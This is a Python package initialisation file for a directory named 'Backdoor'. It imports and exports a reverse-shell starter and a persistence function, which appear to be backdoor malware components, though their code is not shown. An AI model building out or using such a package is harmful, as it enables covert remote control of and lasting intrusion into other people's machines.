# This file makes the Backdoor directory a Python package
# Import key components to make them available when importing the package
from .reverse_shell import start_shell
from .persistence import establish_persistence

__all__ = ['start_shell', 'establish_persistence']